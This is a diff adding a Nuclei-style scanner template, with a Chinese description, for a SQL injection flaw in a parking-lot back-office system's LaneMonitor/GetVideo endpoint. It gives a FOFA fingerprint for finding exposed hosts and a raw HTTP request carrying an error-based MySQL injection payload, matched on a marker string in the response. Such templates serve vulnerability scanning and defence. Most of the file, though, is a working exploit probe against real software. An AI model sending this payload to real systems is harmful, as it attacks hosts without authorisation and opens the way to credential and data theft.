@@ -1,0 +1,32 @@
+id: tingchechang-LaneMonitor_GetVideo-sql
+
+info:
+  name: "停车场后台管理系统 LaneMonitor 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="938984120"
+    停车场后台管理系统 LaneMonitor/GetVideo 接口存在未经验证的SQL注入漏洞。攻击者可通过构造恶意输入绕过输入过滤机制，向数据库执行任意SQL指令。该缺陷允许远程攻击者提取敏感数据（如管理员凭据、用户隐私信息等），在具备高权限写入能力时，可能通过注入命令部署Web Shell，最终实现对目标系统的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/PUF3nilyc7zkDV_xkJBD2A?token=1497378487&lang=zh_CN
+  tags: 停车场后台管理系统
+
+http:
+- raw:
+  - |
+    GET /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qbzxq1qvxkq'
+  - type: status
+    status:
+    - 200
